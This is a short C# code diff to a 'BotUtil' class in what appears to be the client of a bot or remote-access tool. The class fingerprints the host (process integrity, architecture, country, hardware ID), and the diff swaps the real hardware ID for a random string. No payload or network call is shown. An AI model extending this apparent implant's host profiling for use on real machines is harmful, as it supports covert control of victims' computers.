@@ -3,6 +3,7 @@ using System;
 using System.Diagnostics;
 using System.Globalization;
 using System.IO;
+using System.Linq;
 using System.Management;
 using System.Net;
 using System.Net.Sockets;
@@ -13,6 +14,8 @@ namespace pattaya_project_client.Utils
 {
     public static class BotUtil
     {
+
+        private static Random random = new Random();
         public static BotCharacter GenerateChracter()
         {
             var process = Process.GetCurrentProcess();
@@ -42,7 +45,7 @@ namespace pattaya_project_client.Utils
                 Integrity = integrity,
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Country = RegionInfo.CurrentRegion.TwoLetterISORegionName,
-                HWID = GetHardwareId().Replace("-","")
+                HWID = RandomString(13)
             };
 
             process.Dispose();
@@ -100,6 +103,13 @@ namespace pattaya_project_client.Utils
             }
 
             return hardwareId;
+        }
+
+        public static string RandomString(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+                .Select(s => s[random.Next(s.Length)]).ToArray());
         }
     }
 }
